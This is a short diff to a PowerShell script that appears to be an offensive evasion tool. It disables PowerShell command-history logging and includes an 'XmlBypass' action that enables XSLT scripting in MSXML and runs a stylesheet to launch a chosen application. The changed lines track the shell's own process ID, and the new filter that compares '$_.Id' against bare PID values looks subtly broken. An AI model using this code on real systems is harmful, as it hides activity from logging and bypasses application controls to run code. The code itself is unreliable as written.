@@ -88,6 +88,7 @@
 
 
 ## Global cmdlet variable declarations!
+$PPId = $PID ## Prevent this PID from closing!
 $OSMajor = [environment]::OSVersion.Version.Major
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -223,13 +224,15 @@ If($Action -ieq "XmlBypass"){
    $MSXML.setProperty("AllowXsltScript",$true)
 
    Write-Host "trying to execute $RandomMe.xml stylesheet file!"
-   $MSXML.transformNode($MSXML)|Out-Null;Start-Sleep -Seconds 1
+   $MSXML.transformNode($MSXML)|Out-Null;Start-Sleep -Milliseconds 1300
 
    try{
 
       ## Check if sellected application was successfully executed!
-      $CheckApplIdState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Id |
-         Select-Object -First 1 ## NOTE: The 'First' one its the LAST record added to List!
+      # Sellect -Last PID 'NOT' matching the current shell pid to prevent
+      # This powershell process (parent) to close in the end of this function!
+      $CheckApplIdState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Id | Where-Object {
+         $_.Id -ne $PPId } | Select-Object -Last 1
 
    }catch{}
 
